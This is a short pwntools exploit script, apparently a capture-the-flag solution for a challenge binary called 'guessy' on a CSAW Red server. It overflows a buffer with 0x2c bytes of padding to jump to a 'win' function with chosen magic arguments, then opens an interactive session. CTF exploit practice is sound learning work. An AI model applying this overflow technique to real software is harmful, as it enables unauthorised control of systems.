from pwn import *

e = ELF("./guessy")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("pwn.red.csaw.io", 5007)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})

p.sendlineafter("!", "A" * 0x2c + p32(e.symbols["all_I_do_is_win"]) + p32(0) + p32(0x600dc0de) + p32(0xacce5515) + p32(0xfea51b1e))


p.interactive()
